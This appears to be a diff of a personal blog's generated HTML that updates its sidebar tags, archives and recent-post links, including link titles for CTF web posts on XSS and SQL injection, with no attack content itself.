-      <a data-url="http://example.com/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" data-id="ckk1u3o4l0003tsus645bcfkw" data-title="精通黑客脚本笔记" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1820,7 +1888,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
     </div>
   </div>
 
@@ -1830,7 +1898,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E7%AD%94%E6%A1%88/" style="font-size: 10px;">答案</a>
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E7%AD%94%E6%A1%88/" style="font-size: 10px;">答案</a>
     </div>
   </div>
 
@@ -1839,7 +1907,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
     </div>
   </div>
 
@@ -1850,6 +1918,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/02/01/CTF-Web-XSS/">CTF-Web-XSS</a>
+          </li>
         
           <li>
             <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入WAF绕过姿势</a>
@@ -1865,10 +1937,6 @@
         
           <li>
             <a href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/">CTF-Web-SQL注入</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/19/%E6%91%98%E6%8A%84-%E3%80%8A%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF%E3%80%8B/">摘抄-《通往奴役之路》</a>
           </li>
         
       </ul>
